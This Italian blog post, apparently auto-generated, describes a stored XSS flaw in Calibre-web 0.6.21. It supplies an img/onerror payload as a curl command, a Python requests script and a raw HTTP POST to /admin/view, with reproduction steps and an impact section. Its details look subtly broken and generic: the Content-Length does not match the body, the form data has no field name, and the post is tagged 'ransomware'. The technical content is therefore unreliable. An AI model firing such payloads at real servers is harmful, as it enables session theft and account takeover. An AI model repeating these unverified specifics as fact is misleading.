---
layout: post
title: '[webapps] Calibre-web 0.6.21 - Stored XSS' 
date: 2024-08-23
categories: [security, ransomware]
---

# [webapps] Calibre-web 0.6.21 - Stored XSS

## Introduzione

Questo articolo discute di una vulnerabilità di Cross-Site Scripting (XSS) identificata in Calibre-web 0.6.21. L'XSS è un attacco che inserisce script dannosi nelle pagine web visualizzate dalle vittime, abusando della fiducia che l'utente ha nel sito web vulnerabile. Questa vulnerabilità ha un impatto significativo sulla sicurezza dell'applicazione e dei dati degli utenti, poiché può consentire ad un attaccante di rubare informazioni sensibili o di prendere il controllo della sessione dell'utente.

## Dettagli della vulnerabilità

Questa vulnerabilità sfrutta un'istruzione insicura `POST` che non sanifica l'input dell'utente, permettendo all'attaccante di iniettare codice HTML o JavaScript dannoso. La vulnerabilità si manifesta quando un utente visita una pagina web che contiene lo script dannoso.

## Esempio di Payload Semplice

```bash
curl -X POST -d '<img src=x onerror=alert("XSS")>' 'http://<target>/admin/view'
```

## Conversione in Python del Payload Semplice

```python
import requests

url = 'http://<target>/admin/view'
data = '<img src=x onerror=alert("XSS")>'
requests.post(url, data=data)
```

## Spiegazione tecnica

Il comando `curl` effettua una richiesta HTTP `POST` a una URL specifica, inviando dati come corpo della richiesta. In Python, possiamo utilizzare la libreria `requests` per fare lo stesso. La funzione `requests.post` effettua una richiesta `POST` alla URL specificata, con i dati da inviare come corpo della richiesta.

## Procedura per riprodurre la vulnerabilità

1. Sostituire `<target>` con l'indirizzo del server Calibre-web.
2. Eseguire il comando originale o lo script Python sul computer dell'attaccante.
3. L'utente vittima dovrebbe quindi visitare la pagina web 'http://<target>/admin/view' per innescare lo script XSS.

## Richiesta HTTP

```http
POST /admin/view HTTP/1.1
Host: <target>
Content-Length: 28
Content-Type: application/x-www-form-urlencoded

<img src=x onerror=alert("XSS")>
```

## Impatto della vulnerabilità

Se sfruttate, queste vulnerabilità possono permettere ad un attaccante di rubare informazioni sensibili dell'utente, come i cookie di sessione, che potrebbero essere utilizzati per prendere il controllo dell'account dell'utente. Un attaccante potrebbe anche utilizzare lo script per modificare la pagina web, rendendola un veicolo per phishing o altri tipi di attacchi.

## Patch e Mitigazioni

Al momento della pubblicazione, non è disponibile alcuna patch per questa vulnerabilità. Tuttavia, gli sviluppatori di Calibre-web sono stati informati e stanno lavorando per risolvere il problema. In attesa della patch, è consigliabile disabilitare temporaneamente la funzionalità vulnerabile.

## Conclusione

Questa vulnerabilità sottolinea l'importanza di sanificare sempre l'input dell'utente per prevenire attacchi XSS. Anche se può sembrare un dettaglio minore, l'XSS può avere conseguenze devastanti se viene sfruttato. Ricorda sempre di aggiornare le tue applicazioni con le ultime patch di sicurezza non appena disponibili.

